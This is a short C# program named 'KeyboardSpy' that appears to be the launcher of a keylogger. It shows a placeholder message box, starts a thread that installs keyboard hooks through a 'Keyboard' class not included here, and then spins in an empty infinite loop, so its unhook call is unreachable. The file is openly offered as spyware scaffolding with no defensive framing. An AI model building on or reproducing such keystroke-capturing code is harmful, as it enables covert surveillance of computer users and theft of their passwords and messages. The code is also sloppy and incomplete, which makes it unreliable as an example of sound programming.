using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace KeyboardSpy
{

    class Program
    {
        static void Main()
        {
            MessageBox.Show("dsfdfd");
            Keyboard a = new Keyboard();
            Thread g = new Thread(() =>
            {
                    a.SetHooks();
            });
            g.Start();

            while(true)
            {

            }
            a.UnHook();

        }

    }
}
